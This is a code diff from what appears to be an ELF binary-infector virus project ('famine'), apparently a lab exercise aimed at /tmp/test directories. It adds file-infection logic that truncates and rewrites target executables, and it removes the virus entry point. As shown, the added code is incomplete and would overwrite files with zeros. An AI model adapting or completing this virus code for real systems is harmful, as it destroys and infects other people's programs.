@@ -1,5 +1,11 @@
 #include "famine.h"
 
+void	infect(void)
+{
+	search_file_to_infect("/tmp/test");
+	search_file_to_infect("/tmp/test2");
+}
+
 int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 {
 	Elf64_Phdr	*next;
@@ -110,6 +116,29 @@ void	infect_file(char *file)
 						#endif
 						return ;
 					}
+					int		size_needed = INJECT_SIZE + ((intptr_t)_start - (intptr_t)infect);
+					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
+					char	*new;
+					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+					if (!new)
+					{
+						syscall_munmap(elf.addr, elf.size);
+						syscall_close(fd);
+						#ifdef DEBUG
+							debug_print_error(ret, file);
+						#endif
+						return ;
+					}
+					syscall_munmap(elf.addr, elf.size);
+					syscall_close(fd);
+					fd = syscall_open(file, O_TRUNC | O_WRONLY);
+					if (fd < 0)
+					{
+						syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
+						return ;
+					}
+					syscall_write(fd, new, elf.size + size_needed + nb_zero_to_add);
+					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
 					/*
 					int		size_needed = get_size_needed(&elf, virus_elf);
 					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
@@ -198,20 +227,4 @@ void	search_file_to_infect(char *path)
 	}
 	else
 		infect_file(path);
-}
-
-void	infect(void)
-{
-	search_file_to_infect("/tmp/test");
-	search_file_to_infect("/tmp/test2");
-}
-
-int		_start(void)
-{
-	#ifdef DEBUG
-		syscall_write(STDOUT_FILENO, "HOST\n", 5);
-	#endif
-	infect();
-	syscall_exit(0);
-	return (0);
 }
